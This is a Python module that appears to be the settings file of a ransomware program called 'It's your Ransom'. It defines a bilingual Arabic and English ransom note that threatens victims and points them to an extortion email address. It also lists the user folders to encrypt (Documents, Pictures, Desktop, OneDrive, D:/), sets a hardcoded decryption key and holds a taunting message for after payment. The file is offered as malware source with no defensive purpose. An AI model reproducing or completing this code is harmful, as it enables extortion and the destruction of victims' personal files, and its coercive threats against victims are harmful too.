import os

#  the variables and files for (@its your ransom.py)
print("the variables and files for (@its your ransom.py)")


ransom_file = """
   - عربي
     تم تشفير معظم ملفاتك التي على الجهاز.
     لا تحاول تغير اسم الملف او نقل الملف او تغيير اي شيء في الملف حفاظا على ملفاتك,
     يوجد احتماليه ببوظان جميع الملفات اذا تم العبث باي ملف.
      خطوات فك التشفير سهله,
       فقط قم بارسال رساله على البريد الالكتروني ↓ برقم هاتفك
       webforge.sys@gmail.com
      وسيتم التواصل معك لعقد اتفاق واعطائك كود فك التشفير.
      بعد الحصول على الكود, افتح هذا التطبيق مجددا وادخل الكود ثم انتظر وسيتم فك تشفير ملفاتك.
      ستعود ملفاتك الى حالتها الطبيعيه قبل التشفير ولن يتم ضررك بعد الان.
     فقط كن متعاون معنا وكل شيء سيكون على ما يرام.
     تذكر; اي محاوله لفك التشفير او التلاعب بالملفات او البرانمج يدويا ستؤدي الى نتيجه حزينه,
     سوف تودع ملفاتك. كن متعاون وستكون بخير انت وذكرياتك
     لا تلمس اي ملفات جديده تظهر عندك او تتلاعب بها حفاظا على ملفاتك
     (لا تلمس اي ملف او تحركه او تغير فيه اي شيء قبل الغاء التشفير)
اتس يور رانسوم
webforge.sys@gmail.com



     - English
     Your files have been encrypted!
     Don't try to change file name or move any file or change anything in the files
     there is a chance you lose all your data and memories if you toched any file
     decrypt steps is easy
     just send a message on the E-Mail ↓ with your phone number
     webforge.sys@gmail.com
     and we will contact you to make a deal and give you a Decryption Key
     after getting the Key, open this app again and enter the Key and wait. your files will be decrypted
     all your files will be on the normal mode before the encryption
     just keep with us and everything will be okay
     Remember; any try to decrypt or toch the files or the app by yourself. you will be SAD
     be calm, stay with us. and everything will be okay.
     except; your memories will BURN.
     dont remove or move or delete any new files appears or you will be very sad.
     (DONT TOCH ANYTHING YOU DONT KNOW)
"It's your Ransom"
E-Mail: webforge.sys@gmail.com


"""


key_path = "C:/key"


ransom_message = """
=========================================================
ALERT: Your files have been fully encrypted!
Contact (webforge.sys@gmail.com) to decrypt them.
=========================================================

============================================
Alert:
Dont try to toch the files
============================================

You can exit until you get the Key
"""

user_folder = os.path.expanduser("~")

directories1 = [
    os.path.join(user_folder, "Downloads"),
    os.path.join(user_folder, "Videos"),
    os.path.join(user_folder, "Pictures"),
    os.path.join(user_folder, "Documents"),
    os.path.join(user_folder, "Music"),
    os.path.join(user_folder, "OneDrive"),
    os.path.join(user_folder, "Desktop"),
    'D:/'
]  # Directories of encrypted files

directories = [d for d in directories1 if os.path.isdir(d)]

dCode = "c41SqqB62dgIi7posUI156HE0hD7v838ja1o"  #   The Decryption Key

decryption_message = """
         شطوووور! تم فك تشفير ملفاتك!
    ابقى خد بالك المره الجايه :)
اتس يور رانسوم



    Good Boy! Your files have been decrypted!
    Take care next time :>
"It's your Ransom"


        """


